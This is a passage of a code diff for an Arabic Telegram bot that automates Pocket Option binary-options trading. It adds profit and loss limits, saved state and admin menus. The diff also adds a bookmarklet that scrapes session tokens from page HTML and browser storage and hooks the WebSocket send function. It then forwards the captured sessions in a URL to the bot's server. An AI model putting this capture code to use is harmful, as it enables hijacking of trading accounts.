@@ -1,4 +1,5 @@
 import asyncio
+import base64
 import inspect
 import json
 import os
@@ -39,6 +40,7 @@ DEFAULT_AUTH_FRAME = os.getenv(
 )
 
 ACCOUNTS_FILE = "accounts.json"
+STATE_FILE = "bot_state.json"
 
 FALLBACK_CURRENCIES = [
     "EURUSD_otc", "GBPUSD_otc", "USDJPY_otc", "AUDUSD_otc", "USDCAD_otc",
@@ -229,6 +231,14 @@ class AboodControlBot:
         self.locked_candidates = []
 
         # ==========================================
+        # نظام الحدود (حد الربح وحد الخسارة مع زر تفعيل/إيقاف مشترك)
+        # ==========================================
+        self.limits_enabled = False
+        self.profit_limit = 50.0             # حد الربح بالدولار (مثلاً +50$)
+        self.loss_limit = 50.0               # حد الخسارة بالدولار (مثلاً -50$)
+        self.limit_start_balance = None      # رصيد بداية الجلسة لاحتساب الربح/الخسارة بدقة
+
+        # ==========================================
         # نظام المؤشرات والفلاتر (بإعدادات متوسطة ومتوازنة)
         # ==========================================
         self.indicators_enabled = False
@@ -313,6 +323,100 @@ class AboodControlBot:
         self.stats_date = datetime.now(tz=TZ_UTC3).strftime("%Y-%m-%d")
         self.daily_records = []
         self.total_turnover = 0.0
+        self._load_bot_state()
+
+    # ==========================================
+    # حفظ واستعادة الإحصائيات والحدود بشكل خفيف
+    # ==========================================
+    def _load_bot_state(self):
+        if not os.path.exists(STATE_FILE):
+            return
+        try:
+            with open(STATE_FILE, "r", encoding="utf-8") as f:
+                st = json.load(f)
+            if isinstance(st, dict):
+                today_str = datetime.now(tz=TZ_UTC3).strftime("%Y-%m-%d")
+                if st.get("stats_date") == today_str:
+                    self.stats_date = today_str
+                    self.daily_records = list(st.get("daily_records", []))
+                    self.total_turnover = float(st.get("total_turnover", 0.0))
+                self.limits_enabled = bool(st.get("limits_enabled", False))
+                self.profit_limit = float(st.get("profit_limit", 50.0))
+                self.loss_limit = float(st.get("loss_limit", 50.0))
+        except Exception as e:
+            log("STATE_WARN", f"تعذر قراءة ملف الحالة: {e}")
+
+    def _save_bot_state(self):
+        try:
+            with open(STATE_FILE, "w", encoding="utf-8") as f:
+                json.dump({
+                    "stats_date": self.stats_date,
+                    "daily_records": self.daily_records,
+                    "total_turnover": self.total_turnover,
+                    "limits_enabled": self.limits_enabled,
+                    "profit_limit": self.profit_limit,
+                    "loss_limit": self.loss_limit,
+                }, f, ensure_ascii=False, indent=2)
+        except Exception as e:
+            log("STATE_WARN", f"تعذر حفظ ملف الحالة: {e}")
+
+    # ==========================================
+    # محرك فحص حدود الربح والخسارة
+    # ==========================================
+    def reset_limit_baseline(self):
+        if self.account_balance is not None:
+            self.limit_start_balance = float(self.account_balance)
+        else:
+            self.limit_start_balance = None
+
+    def check_and_enforce_limits(self, current_bal: float) -> bool:
+        """
+        يتحقق من حد الربح وحد الخسارة.
+        يرجع True إذا تم الوصول لأحد الحدين وتم إيقاف البوت.
+        """
+        if not self.is_running or not self.limits_enabled:
+            return False
+
+        if self.limit_start_balance is None:
+            self.limit_start_balance = float(current_bal)
+            return False
+
+        start_b = self.limit_start_balance
+        diff = float(current_bal) - start_b
+
+        # 1) فحص حد الربح
+        if self.profit_limit > 0 and diff >= (self.profit_limit - 0.001):
+            self.is_running = False
+            self.full_reset_to_scanning("الوصول إلى حد الربح")
+            self.limit_start_balance = None
+            log("LIMIT_PROFIT", f"🎯 تم الوصول إلى حد الربح! البداية: ${format_money(start_b)} -> الحالي: ${format_money(current_bal)} (+${format_money(diff)})")
+            asyncio.create_task(self.send_admin(
+                f"🎯 <b>تم الوصول إلى حد الربح المحدد — تم إيقاف التداول تلقائيًا ✅</b>\n"
+                f"━━━━━━━━━━━━━━━━━━━━\n"
+                f"💰 <b>رصيد البداية:</b> <code>${format_money(start_b)}</code>\n"
+                f"💵 <b>الرصيد الحالي:</b> <code>${format_money(current_bal)}</code>\n"
+                f"📈 <b>الربح المحقق:</b> <code>+${format_money(diff)}</code> (الحد: <code>${format_money(self.profit_limit)}</code>)",
+                self.build_main_keyboard()
+            ))
+            return True
+
+        # 2) فحص حد الخسارة
+        if self.loss_limit > 0 and (-diff) >= (self.loss_limit - 0.001):
+            self.is_running = False
+            self.full_reset_to_scanning("الوصول إلى حد الخسارة")
+            self.limit_start_balance = None
+            log("LIMIT_LOSS", f"🛑 تم الوصول إلى حد الخسارة! البداية: ${format_money(start_b)} -> الحالي: ${format_money(current_bal)} (-${format_money(abs(diff))})")
+            asyncio.create_task(self.send_admin(
+                f"🛑 <b>تم الوصول إلى حد الخسارة المحدد — تم إيقاف التداول تلقائيًا ⚠️</b>\n"
+                f"━━━━━━━━━━━━━━━━━━━━\n"
+                f"💰 <b>رصيد البداية:</b> <code>${format_money(start_b)}</code>\n"
+                f"💵 <b>الرصيد الحالي:</b> <code>${format_money(current_bal)}</code>\n"
+                f"📉 <b>الخسارة المسجلة:</b> <code>-${format_money(abs(diff))}</code> (الحد: <code>${format_money(self.loss_limit)}</code>)",
+                self.build_main_keyboard()
+            ))
+            return True
+
+        return False
 
     # ==========================================
     # محرك تقييم المؤشرات والفلاتر (بشروط متوسطة)
@@ -501,7 +605,6 @@ class AboodControlBot:
         return url
 
     def register_captured_account(self, name: str, uid: str, demo_session: str, live_session: str) -> dict:
-        """حفظ أو تحديث حساب تم ربطه من الهاتف (يشمل جلسة الديمو والحقيقي معًا)"""
         clean_uid = str(uid).strip() or "Unknown"
         clean_name = (name or "").strip()[:30] or f"حساب {clean_uid}"
 
@@ -533,6 +636,7 @@ class AboodControlBot:
             self.active_account_idx = len(self.accounts) - 1
 
         self.account_balance = None
+        self.limit_start_balance = None
         self.reset_boost_state(reset_peak=True)
         self._sync_active_auth_frame()
         self._save_accounts_storage()
@@ -546,6 +650,13 @@ class AboodControlBot:
         if reset_peak:
             self.peak_balance = float(self.account_balance) if self.account_balance is not None else None
 
+    def reset_daily_stats(self):
+        self.stats_date = datetime.now(tz=TZ_UTC3).strftime("%Y-%m-%d")
+        self.daily_records.clear()
+        self.total_turnover = 0.0
+        self._save_bot_state()
+        log("STATS", "تم تصفير الإحصائيات وعائد التداول بالكامل 🗑️")
+
     def record_trade_outcome(self, pair_name: str, is_win: bool, attempt_num: int):
         today_str = datetime.now(tz=TZ_UTC3).strftime("%Y-%m-%d")
         if today_str != self.stats_date:
@@ -556,6 +667,7 @@ class AboodControlBot:
             "result": "WIN" if is_win else "LOSS",
             "step": attempt_num
         })
+        self._save_bot_state()
 
     def format_daily_stats_report(self) -> str:
         now_dt = datetime.now(tz=TZ_UTC3)
@@ -757,7 +869,7 @@ class AboodControlBot:
         self.pending_martingale_steps.clear()
 
     # ==========================================
-    # واجهة التحكم (خاص بالأدمن) + إدارة الحسابات
+    # واجهة التحكم (خاص بالأدمن) + الحدود + المؤشرات + التعزيز
     # ==========================================
     def build_main_keyboard(self) -> dict:
         toggle_btn = (
@@ -769,6 +881,11 @@ class AboodControlBot:
             {"text": "🧪 الحساب: تجريبي (Demo)", "callback_data": "toggle_account_mode"}
             if self.is_demo_mode
             else {"text": "💵 الحساب: حقيقي (Live) 🔥", "callback_data": "toggle_account_mode"}
+        )
+        limits_btn = (
+            {"text": "🎯 الحدود: مفعّل 🟢", "callback_data": "toggle_limits_master"}
+            if self.limits_enabled
+            else {"text": "🎯 الحدود: متوقف 🔴", "callback_data": "toggle_limits_master"}
         )
         ind_master_btn = (
             {"text": "📊 المؤشرات: مفعّل 🟢", "callback_data": "toggle_indicators_master"}
@@ -803,6 +920,7 @@ class AboodControlBot:
             "inline_keyboard": [
                 [toggle_btn, {"text": "📡 تحديث الحالة", "callback_data": "cmd_status"}],
                 [mode_btn, {"text": "👤 إدارة الحسابات", "callback_data": "menu_accounts"}],
+                [limits_btn, {"text": "⚙️ ضبط الحدود", "callback_data": "menu_limits"}],
                 [ind_master_btn, {"text": "⚙️ ضبط المؤشرات", "callback_data": "menu_indicators"}],
                 [{"text": f"🎯 مستوى المسح: {self.get_scope_label()}", "callback_data": "menu_scope"}],
                 [
@@ -838,6 +956,59 @@ class AboodControlBot:
                 ]
             ]
         }
+
+    def build_limits_keyboard(self) -> dict:
+        en_btn = (
+            {"text": "🎯 حالة الحدود: مفعّل 🟢", "callback_data": "limits_toggle_enable"}
+            if self.limits_enabled
+            else {"text": "🎯 حالة الحدود: متوقف 🔴", "callback_data": "limits_toggle_enable"}
+        )
+        return {
+            "inline_keyboard": [
+                [en_btn],
+                [
+                    {"text": f"📈 حد الربح (+${self.profit_limit:g})", "callback_data": "set_profit_limit"},
+                    {"text": f"📉 حد الخسارة (-${self.loss_limit:g})", "callback_data": "set_loss_limit"}
+                ],
+                [
+                    {"text": "🔄 تصفير نقطة البداية من الرصيد الحالي", "callback_data": "limits_reset_base"}
+                ],
+                [
+                    {"text": "🔙 رجوع للقائمة الرئيسية", "callback_data": "cmd_status"}
+                ]
+            ]
+        }
+
+    def format_limits_menu_text(self) -> str:
+        en_str = "🟢 <b>مفعّل</b> (يتوقف البوت تلقائيًا عند بلوغ أحد الحدين)" if self.limits_enabled else "🔴 <b>متوقف</b>"
+        bal_str = f"${format_money(self.account_balance)}" if self.account_balance is not None else "غير متاح"
+
+        if self.limit_start_balance is not None:
+            start_str = f"${format_money(self.limit_start_balance)}"
+            target_profit_str = f"${format_money(self.limit_start_balance + self.profit_limit)}" if self.profit_limit > 0 else "غير محدد"
+            target_loss_str = f"${format_money(max(0.0, self.limit_start_balance - self.loss_limit))}" if self.loss_limit > 0 else "غير محدد"
+        elif self.account_balance is not None:
+            b = float(self.account_balance)
+            start_str = f"${format_money(b)} (عند التشغيل)"
+            target_profit_str = f"${format_money(b + self.profit_limit)}" if self.profit_limit > 0 else "غير محدد"
+            target_loss_str = f"${format_money(max(0.0, b - self.loss_limit))}" if self.loss_limit > 0 else "غير محدد"
+        else:
+            start_str = "بانتظار جلب الرصيد"
+            target_profit_str = "—"
+            target_loss_str = "—"
+
+        return (
+            f"🎯 <b>إعدادات حدود الربح والخسارة</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"⚙️ <b>الحالة العامة:</b> {en_str}\n"
+            f"💰 <b>الرصيد الحالي:</b> <code>{bal_str}</code>\n"
+            f"📍 <b>رصيد نقطة البداية:</b> <code>{start_str}</code>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"📈 <b>حد الربح:</b> <code>+${self.profit_limit:g}</code> ⬅️ يتوقف عند: <b>{target_profit_str}</b>\n"
+            f"📉 <b>حد الخسارة:</b> <code>-${self.loss_limit:g}</code> ⬅️ يتوقف عند: <b>{target_loss_str}</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"<i>ملاحظة: ضع 0 في أي حد إذا أردت تعطيله والإبقاء على الحد الآخر فقط.</i>"
+        )
 
     def build_boost_keyboard(self) -> dict:
         en_btn = (
@@ -1034,6 +1205,16 @@ class AboodControlBot:
         rate_today = (wins_today / total_today * 100.0) if total_today > 0 else 0.0
         turnover_str = format_money(self.total_turnover)
 
+        if self.limits_enabled:
+            if self.limit_start_balance is not None:
+                p_goal = f"${format_money(self.limit_start_balance + self.profit_limit)}" if self.profit_limit > 0 else "—"
+                l_goal = f"${format_money(max(0.0, self.limit_start_balance - self.loss_limit))}" if self.loss_limit > 0 else "—"
+                limits_status = f"🟢 مفعّل (ربح: <code>{p_goal}</code> | خسارة: <code>{l_goal}</code>)"
+            else:
+                limits_status = f"🟢 مفعّل (+${self.profit_limit:g} / -${self.loss_limit:g})"
+        else:
+            limits_status = "🔴 متوقف"
+
         fast_status = "🟢 مفعّل (مسح مستمر وتجهيز متوازي)" if self.fast_mode else "🔴 متوقف"
         mtg_status = (
             f"🟢 مفعّل (<code>{ladder_str}</code>)"
@@ -1085,7 +1266,8 @@ class AboodControlBot:
             f"📊 <b>إحصائيات اليوم:</b> <code>{wins_today}/{total_today}</code> ({rate_today:.1f}%)\n"
             f"💵 <b>عائد التداول (Turnover):</b> <code>${turnover_str}</code>\n"
             f"━━━━━━━━━━━━━━━━━━━━\n"
-            f"🎯 <b>مستوى المسح:</b> <b>{self.get_scope_label()}</b>\n"
+            f"🎯 <b>الحدود (ربح/خسارة):</b> {limits_status}\n"
+            f"🔭 <b>مستوى المسح:</b> <b>{self.get_scope_label()}</b>\n"
             f"📊 <b>المؤشرات والفلاتر:</b> {self.get_active_indicators_summary()}\n"
             f"👯 <b>المزدوج / الصفقات:</b> يمسك <code>{self.max_locked_pairs}</code> عملات | يدخل <code>{self.max_concurrent_trades}</code> صفقات\n"
             f"⚡ <b>الوضع السريع:</b> {fast_status}\n"
@@ -1197,13 +1379,33 @@ class AboodControlBot:
                         msg_id = cq["message"]["message_id"]
                         data = cq.get("data", "")
 
-                        asyncio.create_task(self.tg_api("answerCallbackQuery", {"callback_query_id": cq["id"]}, req_timeout=10.0, retries=1))
                         if chat_id != str(ADMIN_CHAT_ID):
+                            asyncio.create_task(self.tg_api("answerCallbackQuery", {"callback_query_id": cq["id"]}, req_timeout=10.0, retries=1))
                             continue
+
+                        if data == "stats_reset":
+                            self.reset_daily_stats()
+                            asyncio.create_task(self.tg_api("answerCallbackQuery", {
+                                "callback_query_id": cq["id"],
+                                "text": "✅ تم تصفير الإحصائيات وعائد التداول بالكامل!",
+                                "show_alert": True
+                            }, req_timeout=10.0, retries=1))
+                            await self.tg_api("editMessageText", {
+                                "chat_id": ADMIN_CHAT_ID,
+                                "message_id": msg_id,
+                                "text": self.format_dashboard_text(),
+                                "parse_mode": "HTML",
+                                "reply_markup": self.build_main_keyboard()
+                            })
+                            continue
+
+                        asyncio.create_task(self.tg_api("answerCallbackQuery", {"callback_query_id": cq["id"]}, req_timeout=10.0, retries=1))
 
                         if data == "cmd_start":
                             self.is_running = True
                             self.awaiting_input = None
+                            if self.limits_enabled:
+                                self.reset_limit_baseline()
                             log("CTRL", "تم تشغيل البوت من لوحة الإدارة ▶️")
                         elif data == "cmd_stop":
                             self.is_running = False
@@ -1212,6 +1414,60 @@ class AboodControlBot:
                             log("CTRL", "تم إيقاف البوت من لوحة الإدارة ⏹")
                         elif data == "cmd_status":
                             self.awaiting_input = None
+                        elif data == "toggle_limits_master":
+                            self.limits_enabled = not self.limits_enabled
+                            if self.limits_enabled:
+                                self.reset_limit_baseline()
+                            else:
+                                self.limit_start_balance = None
+                            self._save_bot_state()
+                            log("LIMITS", f"حالة الحدود (ربح/خسارة): {'مفعّل 🟢' if self.limits_enabled else 'متوقف 🔴'}")
+                        elif data == "menu_limits":
+                            await self.tg_api("editMessageText", {
+                                "chat_id": ADMIN_CHAT_ID,
+                                "message_id": msg_id,
+                                "text": self.format_limits_menu_text(),
+                                "parse_mode": "HTML",
+                                "reply_markup": self.build_limits_keyboard()
+                            })
+                            continue
+                        elif data == "limits_toggle_enable":
+                            self.limits_enabled = not self.limits_enabled
+                            if self.limits_enabled:
+                                self.reset_limit_baseline()
+                            else:
+                                self.limit_start_balance = None
+                            self._save_bot_state()
+                            await self.tg_api("editMessageText", {
+                                "chat_id": ADMIN_CHAT_ID,
+                                "message_id": msg_id,
+                                "text": self.format_limits_menu_text(),
+                                "parse_mode": "HTML",
+                                "reply_markup": self.build_limits_keyboard()
+                            })
+                            continue
+                        elif data == "limits_reset_base":
+                            self.reset_limit_baseline()
+                            await self.tg_api("editMessageText", {
+                                "chat_id": ADMIN_CHAT_ID,
+                                "message_id": msg_id,
+                                "text": self.format_limits_menu_text(),
+                                "parse_mode": "HTML",
+                                "reply_markup": self.build_limits_keyboard()
+                            })
+                            continue
+                        elif data == "set_profit_limit":
+                            self.awaiting_input = "PROFIT_LIMIT"
+                            await self.send_admin(
+                                "📈 أرسل الآن <b>حد الربح بالدولار</b> (مثال: <code>50</code>؛ أو <code>0</code> لتعطيله):"
+                            )
+                            continue
+                        elif data == "set_loss_limit":
+                            self.awaiting_input = "LOSS_LIMIT"
+                            await self.send_admin(
+                                "📉 أرسل الآن <b>حد الخسارة بالدولار</b> (مثال: <code>50</code>؛ أو <code>0</code> لتعطيله):"
+                            )
+                            continue
                         elif data == "send_mobile_link_copy":
                             link = self.get_mobile_connect_url()
                             await self.send_admin(
@@ -1220,7 +1476,7 @@ class AboodControlBot:
                                 f"📌 <b>الخطوات السريعة:</b>\n"
                                 f"1️⃣ شغّل الـ <b>VPN</b> على هاتفك.\n"
                                 f"2️⃣ انسخ الرابط أعلاه وافتحه في متصفح <b>Chrome</b> أو <b>Safari</b> الخارجي.\n"
-                                f"3️⃣ اتبع الخطوة الموضحة في الصفحة لربط <b>الديمو + الحقيقي + الآيدي</b> دفعة واحدة."
+                                f"3️⃣ انسخ كود الربط السريع من الصفحة واحفظه في مفضلة المتصفح، ثم افتح Pocket Option وسجّل الدخول واضغط على المفضلة."
                             )
                             continue
                         elif data == "menu_boost":
@@ -1349,9 +1605,6 @@ class AboodControlBot:
                                 f"(يلزم أن يكون الرقم <b>أقل أو يساوي {self.max_locked_pairs}</b>):"
                             )
                             continue
-                        elif data == "stats_reset":
-                            self.reset_daily_stats()
-                            await self.send_admin("🗑️ <b>تم تصفير الإحصائيات وعائد التداول بنجاح!</b>")
                         elif data == "toggle_account_mode":
                             if self.is_demo_mode:
                                 acc = self.get_active_account()
@@ -1377,6 +1630,7 @@ class AboodControlBot:
                             else:
                                 self.is_demo_mode = True
                                 self.account_balance = None
+                                self.limit_start_balance = None
                                 self.reset_boost_state(reset_peak=True)
                                 self._sync_active_auth_frame()
                                 self._save_accounts_storage()
@@ -1387,6 +1641,7 @@ class AboodControlBot:
                         elif data == "confirm_live_mode":
                             self.is_demo_mode = False
                             self.account_balance = None
+                            self.limit_start_balance = None
                             self.reset_boost_state(reset_peak=True)
                             self._sync_active_auth_frame()
                             self._save_accounts_storage()
@@ -1417,6 +1672,7 @@ class AboodControlBot:
                                 if 0 <= idx < len(self.accounts):
                                     self.active_account_idx = idx
                                     self.account_balance = None
+                                    self.limit_start_balance = None
                                     self.reset_boost_state(reset_peak=True)
                                     self._sync_active_auth_frame()
                                     self._save_accounts_storage()
@@ -1453,6 +1709,7 @@ class AboodControlBot:
                                     if self.active_account_idx >= len(self.accounts):
                                         self.active_account_idx = 0
                                     self.account_balance = None
+                                    self.limit_start_balance = None
                                     self.reset_boost_state(reset_peak=True)
                                     self._sync_active_auth_frame()
                                     self._save_accounts_storage()
@@ -1597,7 +1854,39 @@ class AboodControlBot:
                             )
                             continue
 
-                        if self.awaiting_input == "BOOST_WINS":
+                        if self.awaiting_input == "PROFIT_LIMIT":
+                            try:
+                                val = float(text.replace("$", ""))
+                                if val >= 0:
+                                    self.profit_limit = val
+                                    self._save_bot_state()
+                                    self.awaiting_input = None
+                                    await self.send_admin(
+                                        f"✅ تم ضبط <b>حد الربح</b> إلى <b>+${val:g}</b>.",
+                                        self.build_limits_keyboard()
+                                    )
+                                else:
+                                    await self.send_admin("⚠️ أدخل رقمًا أكبر من أو يساوي 0:")
+                            except ValueError:
+                                await self.send_admin("⚠️ أرسل رقمًا صحيحًا (مثال: <code>50</code>):")
+
+                        elif self.awaiting_input == "LOSS_LIMIT":
+                            try:
+                                val = float(text.replace("$", ""))
+                                if val >= 0:
+                                    self.loss_limit = val
+                                    self._save_bot_state()
+                                    self.awaiting_input = None
+                                    await self.send_admin(
+                                        f"✅ تم ضبط <b>حد الخسارة</b> إلى <b>-${val:g}</b>.",
+                                        self.build_limits_keyboard()
+                                    )
+                                else:
+                                    await self.send_admin("⚠️ أدخل رقمًا أكبر من أو يساوي 0:")
+                            except ValueError:
+                                await self.send_admin("⚠️ أرسل رقمًا صحيحًا (مثال: <code>50</code>):")
+
+                        elif self.awaiting_input == "BOOST_WINS":
                             try:
                                 w_cnt = int(text)
                                 if 1 <= w_cnt <= 50:
@@ -2022,6 +2311,9 @@ class AboodControlBot:
         if not self.ws or not self.authenticated or not self.is_running:
             return
 
+        if self.account_balance is not None and self.check_and_enforce_limits(float(self.account_balance)):
+            return
+
         if cycle_base is None:
             cycle_base = self.get_current_entry_base()
 
@@ -2081,6 +2373,7 @@ class AboodControlBot:
 
         self.total_turnover += amount
         self.current_cycle_spent += amount
+        self._save_bot_state()
 
         order_payload = {
             "asset": asset,
@@ -2613,6 +2906,10 @@ class AboodControlBot:
                 mode_label = "الديمو" if self.is_demo_mode else "الحقيقي"
                 log("BALANCE", f"رصيد الحساب ({mode_label}) الحالي: ${format_money(new_bal)}")
 
+                # فحص حدود الربح والخسارة فور تحديث الرصيد
+                if self.check_and_enforce_limits(new_bal):
+                    return
+
                 if self.peak_balance is None:
                     self.peak_balance = new_bal
                 elif new_bal >= self.peak_balance:
@@ -2775,11 +3072,58 @@ class AboodControlBot:
     # ==========================================
     # بوابة الويب المدمجة للهواتف (أندرويد / آيفون) + مراقبة Render 24/7
     # ==========================================
+    def build_bookmarklet_js(self, acc_name: str = "حساب الهاتف") -> str:
+        """بناء كود الالتقاط الذكي (يفحص الصفحة + التخزين + صفحتي الديمو والحقيقي + WebSocket المباشر)"""
+        cfg_b64 = base64.b64encode(json.dumps({
+            "base": PUBLIC_BASE_URL,
+            "token": self.web_connect_token,
+            "name": (acc_name.strip() or "حساب الهاتف")
+        }).encode("utf-8")).decode("ascii")
+
+        payload_js = (
+            "(async function(){"
+            "try{"
+            f"var cfg=JSON.parse(decodeURIComponent(escape(atob('{cfg_b64}'))));"
+            "function sendAll(u,ds,ls){"
+            "if(!ds&&!ls)return false;"
+            "location.href=cfg.base+'/api/mobile_capture_redirect?token='+encodeURIComponent(cfg.token)+'&name='+encodeURIComponent(cfg.name)+'&uid='+encodeURIComponent(u||'Unknown')+'&demo_s='+encodeURIComponent(ds||ls)+'&live_s='+encodeURIComponent(ls||ds);"
+            "return true;"
+            "}"
+            "function scanText(t){"
+            "if(!t)return{};"
+            "var u=(t.match(/['\"]?uid['\"]?\\s*[:=]\\s*['\"]?(\\d{5,15})['\"]?/i)||t.match(/data-uid=['\"](\\d{5,15})['\"]/i)||[])[1]||'';"
+            "var s=(t.match(/['\"]?session['\"]?\\s*[:=]\\s*['\"]([a-zA-Z0-9_-]{16,64})['\"]/i)||[])[1]||'';"
+            "return{u:u,s:s};"
+            "}"
+            "var r=scanText(document.documentElement.innerHTML);"
+            "var u=r.u,ds=r.s,ls=r.s;"
+            "try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i),v=localStorage.getItem(k)||'';var m=scanText(k+':'+v);if(m.u&&!u)u=m.u;if(m.s&&!ds){ds=m.s;ls=m.s;}}}catch(e){}"
+            "try{for(var j=0;j<sessionStorage.length;j++){var k2=sessionStorage.key(j),v2=sessionStorage.getItem(k2)||'';var m2=scanText(k2+':'+v2);if(m2.u&&!u)u=m2.u;if(m2.s&&!ds){ds=m2.s;ls=m2.s;}}}catch(e){}"
+            "var paths=['/en/cabinet/demo-quick-high-low/','/ar/cabinet/demo-quick-high-low/','/cabinet/demo-quick-high-low/'];"
+            "for(var p=0;p<paths.length;p++){try{var f1=await fetch(paths[p],{credentials:'include'});if(f1.ok){var t1=await f1.text();var g1=scanText(t1);if(g1.s)ds=g1.s;if(g1.u&&!u)u=g1.u;if(g1.s)break;}}catch(e){}}"
+            "var lpaths=['/en/cabinet/quick-high-low/','/ar/cabinet/quick-high-low/','/cabinet/quick-high-low/'];"
+            "for(var q=0;q<lpaths.length;q++){try{var f2=await fetch(lpaths[q],{credentials:'include'});if(f2.ok){var t2=await f2.text();var g2=scanText(t2);if(g2.s)ls=g2.s;if(g2.u&&!u)u=g2.u;if(g2.s)break;}}catch(e){}}"
+            "if(sendAll(u,ds,ls))return;"
+            "var b=document.createElement('div');"
+            "b.style.cssText='position:fixed;top:0;left:0;right:0;z-index:999999;background:#059669;color:#fff;padding:14px;text-align:center;font-size:15px;font-weight:bold;direction:rtl;';"
+            "b.innerText='⏳ جاري انتظار اتصال المنصة... بدّل الآن بين الحساب التجريبي والحقيقي في المنصة ليتم الالتقاط تلقائيًا!';"
+            "document.body.appendChild(b);"
+            "var origSend=WebSocket.prototype.send;"
+            "WebSocket.prototype.send=function(d){"
+            "try{if(typeof d==='string'&&d.indexOf('42[\"auth\"')===0){var obj=JSON.parse(d.slice(2))[1];if(obj&&obj.session){sendAll(String(obj.uid||u),obj.session,obj.session);}}}catch(e){}"
+            "return origSend.apply(this,arguments);"
+            "};"
+            "}catch(err){alert('خطأ: '+err);}"
+            "})();"
+        )
+        return "javascript:" + payload_js
+
     def render_mobile_connect_html(self, prefill_name: str = "") -> str:
         safe_name = prefill_name.replace('"', "").replace("<", "").replace(">", "")
         token_js = json.dumps(self.web_connect_token)
         base_url_js = json.dumps(PUBLIC_BASE_URL)
         prefill_js = json.dumps(safe_name)
+        initial_bm = self.build_bookmarklet_js(safe_name or "حساب الهاتف")
 
         return f"""<!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -2796,7 +3140,8 @@ class AboodControlBot:
   p.sub {{ margin: 0 0 16px; font-size: 13px; color: #94a3b8; text-align: center; line-height: 1.5; }}
   .step {{ background: #0f172a; border: 1px solid #1e293b; border-radius: 12px; padding: 14px; margin-bottom: 12px; }}
   .step-title {{ font-weight: 700; font-size: 14px; color: #38bdf8; margin-bottom: 8px; }}
-  input, textarea {{ width: 100%; background: #1e293b; border: 1px solid #334155; color: #fff; padding: 11px 12px; border-radius: 10px; font-size: 14px; outline: none; }}
+  input, textarea {{ width: 100%; background: #1e293b; border: 1px solid #334155; color: #fff; padding: 11px 12px; border-radius: 10px; font-size: 13px; outline: none; direction: ltr; }}
+  input#accName {{ direction: rtl; font-size: 14px; }}
   input:focus, textarea:focus {{ border-color: #10b981; }}
   .btn {{ display: block; width: 100%; text-align: center; padding: 13px; border-radius: 11px; font-weight: 700; font-size: 14px; text-decoration: none; border: none; cursor: pointer; margin-top: 8px; }}
   .btn-primary {{ background: linear-gradient(135deg, #10b981, #059669); color: #fff; }}
@@ -2812,7 +3157,7 @@ class AboodControlBot:
 <div class="card">
   <div id="wvBanner" class="wv-alert">
     ⚠️ <b>أنت الآن داخل متصفح تيليجرام الداخلي!</b><br>
-    لنجاح ربط الحساب على الهاتف، يجب فتح هذه الصفحة في متصفح <b>Chrome</b> أو <b>Safari</b> الخارجي (مع تشغيل الـ VPN):
+    لنجاح ربط الحساب على الهاتف، افتح هذه الصفحة في متصفح <b>Chrome</b> أو <b>Safari</b> الخارجي (مع تشغيل الـ VPN):
     <button class="btn btn-red" onclick="openExternalBrowser()">🌐 فتح في متصفح Chrome / Safari الخارجي</button>
     <button class="btn btn-amber" onclick="copyPageUrl()">📋 نسخ رابط هذه الصفحة لفتحه في المتصفح</button>
   </div>
@@ -2826,13 +3171,14 @@ class AboodControlBot:
   </div>
 
   <div class="step">
-    <div class="step-title">2️⃣ تجهيز زر الربط في متصفح الهاتف</div>
+    <div class="step-title">2️⃣ نسخ كود الربط وحفظه في مفضلة المتصفح</div>
     <p class="hint">
-      • اضغط زر <b>نسخ كود الربط السريع</b> بالأسفل.<br>
+      • اضغط زر <b>نسخ كود الربط السريع</b> (أو انسخه من الصندوق أدناه).<br>
       • ثم اضغط قائمة المتصفح (<b>⋮</b> أو المشاركة) ⬅️ <b>إضافة إلى المفضلة (⭐)</b> ⬅️ <b>تعديل (Edit)</b> ⬅️ غيّر الاسم إلى <b>ربط البوت</b> والصق الكود المنسوخ في خانة <b>الرابط (URL)</b>.
     </p>
+    <textarea id="codeBox" rows="3" readonly onclick="this.select()">{initial_bm}</textarea>
     <button class="btn btn-amber" onclick="copySmartExtractor()">📋 نسخ كود الربط السريع (Demo + Live)</button>
-    <div id="copyToast" class="toast">✅ تم نسخ كود الربط! الآن احفظ هذه الصفحة في المفضلة (⭐) وعدّل الرابط (URL) بلصق الكود فيه.</div>
+    <div id="copyToast" class="toast">✅ تم نسخ كود الربط بنجاح! احفظ هذه الصفحة في المفضلة (⭐) وعدّل الرابط (URL) بلصق الكود فيه.</div>
   </div>
 
   <div class="step">
@@ -2860,17 +3206,18 @@ class AboodControlBot:
   const BASE_URL = {base_url_js};
   const PREFILL = {prefill_js};
   const nameInput = document.getElementById('accName');
+  const codeBox = document.getElementById('codeBox');
   if (PREFILL) nameInput.value = PREFILL;
 
   const ua = navigator.userAgent || '';
   const isAndroid = /Android/i.test(ua);
-  const isTgWebView = /Telegram/i.test(ua) || (isAndroid && /; wv\)/i.test(ua));
+  const isTgWebView = /Telegram/i.test(ua) || (isAndroid && /; wv\\)/i.test(ua));
   if (isTgWebView) {{
     document.getElementById('wvBanner').style.display = 'block';
   }}
 
   function openExternalBrowser() {{
-    const cleanUrl = window.location.href.replace(/^https?:\/\//, '');
+    const cleanUrl = window.location.href.replace(/^https?:\\/\\//, '');
     if (isAndroid) {{
       window.location.href = 'intent://' + cleanUrl + '#Intent;scheme=https;package=com.android.chrome;end';
     }} else {{
@@ -2878,32 +3225,65 @@ class AboodControlBot:
     }}
   }}
 
+  function fallbackCopyText(txt) {{
+    const ta = document.createElement('textarea');
+    ta.value = txt;
+    ta.style.position = 'fixed';
+    ta.style.opacity = '0';
+    document.body.appendChild(ta);
+    ta.focus();
+    ta.select();
+    let ok = false;
+    try {{ ok = document.execCommand('copy'); }} catch (e) {{}}
+    document.body.removeChild(ta);
+    return ok;
+  }}
+
   function copyPageUrl() {{
     const url = window.location.href;
     if (navigator.clipboard && navigator.clipboard.writeText) {{
       navigator.clipboard.writeText(url).then(() => {{
         alert('✅ تم نسخ الرابط! افتح متصفح Safari أو Chrome الآن والصقه في شريط العنوان.');
-      }}).catch(() => {{ prompt('انسخ الرابط التالي وافتحه في المتصفح الخارجي:', url); }});
+      }}).catch(() => {{
+        fallbackCopyText(url);
+        alert('✅ تم نسخ الرابط! افتح متصفح Safari أو Chrome الآن والصقه في شريط العنوان.');
+      }});
     }} else {{
